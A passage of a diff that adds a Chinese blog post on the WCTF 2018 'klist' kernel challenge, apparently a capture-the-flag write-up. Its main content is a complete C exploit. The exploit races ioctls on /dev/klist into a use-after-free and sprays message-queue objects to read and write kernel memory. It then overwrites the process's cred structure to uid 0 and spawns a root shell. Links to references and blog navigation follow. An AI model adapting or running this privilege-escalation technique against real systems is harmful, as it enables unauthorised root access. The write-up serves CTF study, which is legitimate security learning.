+<h3 id="综上，exp"><a href="#综上，exp" class="headerlink" title="综上，exp"></a>综上，exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/auxv.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFF_SIZE 96 - 48</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">struct chunk&#123;</span></span><br><span class="line"><span class="comment">    inuse</span></span><br><span class="line"><span class="comment">    size</span></span><br><span class="line"><span class="comment">    prev</span></span><br><span class="line"><span class="comment">    buf</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">create_chunk_arg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> mtype;</span><br><span class="line">    <span class="keyword">char</span> mtext[BUFF_SIZE];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_cred_root</span><span class="params">(<span class="keyword">char</span> *cred, <span class="keyword">int</span> len, <span class="keyword">int</span> id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i += <span class="number">4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (*(<span class="keyword">int</span> *)(cred + i) == id)</span><br><span class="line">            *(<span class="keyword">int</span> *)(cred + i) = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_hex</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data :\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; (size / <span class="number">8</span>); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; %16llx&quot;</span>, *(<span class="keyword">size_t</span> *)(buf + i * <span class="number">8</span>));</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">myMemmem</span><span class="params">(<span class="keyword">char</span> *a, <span class="keyword">int</span> alen, <span class="keyword">char</span> *b, <span class="keyword">int</span> blen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, j;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= alen - blen; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; blen; ++j)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (a[i + j] != b[j])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (j &gt;= blen)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">create_chunk_arg</span> <span class="title">create_arg</span>;</span></span><br><span class="line">    <span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line">    <span class="keyword">int</span> fd;</span><br><span class="line">    <span class="keyword">char</span> *res = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    fd = open(<span class="string">&quot;/dev/klist&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-]open file error\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x200</span>);</span><br><span class="line">    create_arg.size = <span class="number">96</span> - <span class="number">0x18</span>;</span><br><span class="line">    create_arg.buf = buf;</span><br><span class="line">    ioctl(fd, <span class="number">0x1337</span>, &amp;create_arg);</span><br><span class="line">    <span class="keyword">if</span> (fork() == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            ioctl(fd, <span class="number">0x1337</span>, &amp;create_arg);</span><br><span class="line">            ioctl(fd, <span class="number">0x133A</span>, res);</span><br><span class="line">            <span class="keyword">if</span> (*(<span class="keyword">int</span> *)res == <span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[*]get the UAF chunk!\n&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-]gg\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1500</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ioctl(fd, <span class="number">0x133A</span>, res);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fork() == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">msg</span> <span class="title">msg</span>;</span></span><br><span class="line">            <span class="keyword">int</span> i;</span><br><span class="line">            <span class="built_in">memset</span>(msg.mtext, <span class="number">0x42</span>, BUFF_SIZE - <span class="number">1</span>);</span><br><span class="line">            msg.mtext[BUFF_SIZE] = <span class="number">0</span>;</span><br><span class="line">            msg.mtype = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; BUFF_SIZE; i++)</span><br><span class="line">                msg.mtext[i] = <span class="string">&#x27;\xff&#x27;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">int</span> msqid = msgget(IPC_PRIVATE, <span class="number">0644</span> | IPC_CREAT);</span><br><span class="line"></span><br><span class="line">            msgsnd(msqid, &amp;msg, <span class="keyword">sizeof</span>(msg.mtext), <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(res, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    ioctl(fd, <span class="number">0x1338</span>, <span class="number">0</span>);</span><br><span class="line">    read(fd, res, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="keyword">if</span> (*(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> *)res == <span class="number">0x6161616161616161</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] cannot realloc the chunk &quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] now we can read everywhere&quot;</span>);</span><br><span class="line">    <span class="keyword">char</span> *mem = <span class="built_in">malloc</span>(<span class="number">0x300000</span>);</span><br><span class="line">    read(fd, mem, <span class="number">0x300000</span>);</span><br><span class="line">    <span class="keyword">char</span> cred[<span class="number">0x20</span>];</span><br><span class="line">    *(<span class="keyword">size_t</span> *)cred = <span class="number">0x000003e800000003</span>;</span><br><span class="line">    *(<span class="keyword">size_t</span> *)(cred + <span class="number">8</span>) = <span class="number">0x000003e8000003e8</span>;</span><br><span class="line">    *(<span class="keyword">size_t</span> *)(cred + <span class="number">0x10</span>) = <span class="number">0x000003e8000003e8</span>;</span><br><span class="line">    *(<span class="keyword">size_t</span> *)(cred + <span class="number">0x18</span>) = <span class="number">0x000003e8000003e8</span>;</span><br><span class="line">    <span class="keyword">int</span> found = myMemmem(mem, <span class="number">0x300000</span>, cred, <span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">if</span> (found == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-]cannot find cred struct !&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> *<span class="keyword">final</span> = found + mem;</span><br><span class="line">    print_hex(<span class="keyword">final</span> - <span class="number">0x8</span>, <span class="number">0xb0</span>);</span><br><span class="line">    set_cred_root(<span class="keyword">final</span> - <span class="number">0x8</span>, <span class="number">0x40</span>, <span class="number">1000</span>);</span><br><span class="line">    print_hex(<span class="keyword">final</span> - <span class="number">0x8</span>, <span class="number">0xb0</span>);</span><br><span class="line">    write(fd, mem, found + <span class="number">0xb0</span>);</span><br><span class="line">    <span class="keyword">if</span> (getuid() == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+]now you are r00t,enjoy ur shell\n&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] there must be something error ... &quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里就是成功的结果图：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/image-20220807171554006.png"
+                      alt="image-20220807171554006"
+                ></p>
+<p>题目我会放在：<a class="link"   target="_blank" rel="noopener" href="https://github.com/196082/196082" >https://github.com/196082/196082<i class="fas fa-external-link-alt"></i></a></p>
+<hr>
+<p>参考链接：</p>
+<p><a class="link"   target="_blank" rel="noopener" href="http://p4nda.top/2018/11/27/wctf-2018-klist/#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8" >http://p4nda.top/2018/11/27/wctf-2018-klist/#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2814" >https://xz.aliyun.com/t/2814<i class="fas fa-external-link-alt"></i></a></p>
+
+        </div>
+
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2022/08/10/starCTF-2019-hackme/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">starCTF 2019 hackme</span>
+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2022/08/05/house-of-apple2/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">house of apple续</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+            <div class="comment-container">
+                <div class="comments-container">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fas fa-comments">&nbsp;评论</i>
+    </div>
+    
+
+        
+            
+    <div class="valine-container">
+        <script 
+                src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
+        <div id="vcomments"></div>
+        <script >
+            function loadValine() {
+                new Valine({
+                    el: '#vcomments',
+                    appId: 'OcvtJuJHDrSFIyDGdp3rLMtA-gzGzoHsz',
+                    appKey: 'C672AAYGXMkHxztf8ntdLShs',
+                    meta: ['nick', 'mail', 'link'],
+                    avatar: 'wavatar',
+                    enableQQ: true,
+                    placeholder: '😜若有问题请各位大师傅留言评论',
+                    lang: 'zh-CN'.toLowerCase()
+                });
+
+                function getAuthor(language) {
+                    switch (language) {
+                        case 'en':
+                            return 'Author';
+                        case 'zh-CN':
+                            return '博主';
+                        default:
+                            return 'Master';
+                    }
+                }
+
+                // Add "Author" identify
+                const getValineDomTimer = setInterval(() => {
+                    const vcards = document.querySelectorAll('#vcomments .vcards .vcard');
+                    if (vcards.length > 0) {
+                        let author = '196082';
+
+                        if (author) {
+                            for (let vcard of vcards) {
+                                const vnick_dom = vcard.querySelector('.vhead .vnick');
+                                const vnick = vnick_dom.innerHTML;
+                                if (vnick === author) {
+                                    vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
+                                }
+                            }
+                        }
+                        clearInterval(getValineDomTimer);
+                    } else {
+                        clearInterval(getValineDomTimer);
+                    }
+                }, 2000);
+            }
+
+            if ('false') {
+                const loadValineTimeout = setTimeout(() => {
+                    loadValine();
+                    clearTimeout(loadValineTimeout);
+                }, 1000);
+            } else {
+                window.addEventListener('DOMContentLoaded', loadValine);
+            }
+        </script>
+    </div>
 
 
-  .article-header {
-    position: relative;
-    padding-left: $avatarWidth;
-    width: 100%;
-    height: $avatarWidth;
-    box-sizing: border-box;
 
-    .avatar {
-      position: absolute;
-      top: 0
-      left: 0;
-      width: $avatarWidth;
-      height: $avatarWidth;
-      padding: 1px;
-      box-sizing: border-box;
-      border: 1px solid var(--border-color);
-      border-radius: 50%;
+        
+    
+</div>
 
-      img {
-        border-radius: 50%;
-        width: 100%;
-        height: 100%;
-        background: var(--avatar-background-color);
-      }
-
-    }
-
-
-    .info {
-      padding: 2px 0;
-      margin-left: 10px;
-      box-sizing: border-box;
-      display: flex;
-      flex-direction: column;
-      justify-content: space-between;
-      width: 100%;
-      height: 100%;
-
-      .author {
-        font-weight: 600;
-        font-size: 1.18rem;
-        display: flex;
-        align-items: center;
-
-        .name {
-          color: var(--default-text-color);
-        }
-
-        .author-label {
-          margin-left: 10px;
-          font-size: 0.8rem;
-          font-weight: 500;
-          padding: 0 5px;
-          border-radius: 5px;
-          color: #fff;
-          background: var(--selection-color);
-        }
-
-      }
-    }
-
-  }
-
-
-  .article-header, .article-header-meta-info {
-    margin-top: 16px;
-    +keep-tablet() {
-      transform: scale(0.9);
-      transform-origin: left top;
-    }
-  }
-
-
-  .article-content {
-    margin-top: $component-spacing-value;
-    padding-bottom: 10px;
-    word-wrap: break-word;
-    border-bottom: 1px solid var(--border-color);
-    color: var(--default-text-color);
-  }
-
-  .post-copyright-info {
-    margin-top: $component-spacing-value;
-    width: 100%;
-  }
-
-  .article-nav {
-    height: 40px;
-    margin-top: $component-spacing-value;
-
-    .article-prev, .article-next {
-      max-width: $post-nav-max-width;
-      height: 100%;
-      box-sizing: border-box;
-
-      keep-container(true, 1.03, 1.03, 10px, 0);
-
-      a {
-        position: relative;
-        display: block;
-        width: 100%;
-        height: 100%;
-        box-sizing: border-box;
-
-        &.prev {
-          padding-left: $arrow-icon-width;
-        }
-
-        &.next {
-          padding-right: $arrow-icon-width;
-        }
-
-        .arrow-icon {
-          position: absolute;
-          top: 0;
-          height: 100%;
-          width: $arrow-icon-width;
-
-          &.left {
-            left: 0;
-          }
-
-          &.right {
-            right: 0;
-          }
-        }
-
-        .title {
-          width: 100%;
-          height: 100%;
-        }
-      }
-
-    }
-
-    .article-prev {
-      float: left;
-    }
-
-    .article-next {
-      float: right;
-    }
-
-    .post-nav-item {
-      display: none;
-
-      +keep-tablet() {
-        display: inline-block;
-      }
-
-    }
-
-
-    .post-nav-title-item {
-      overflow: hidden;
-      text-overflow: ellipsis;
-      white-space: nowrap;
-
-      +keep-tablet() {
-        display: none;
-      }
-    }
-
-  }
-
-
-}
-
+            </div>
+        
+    </div>
+</div>
 
 
                 
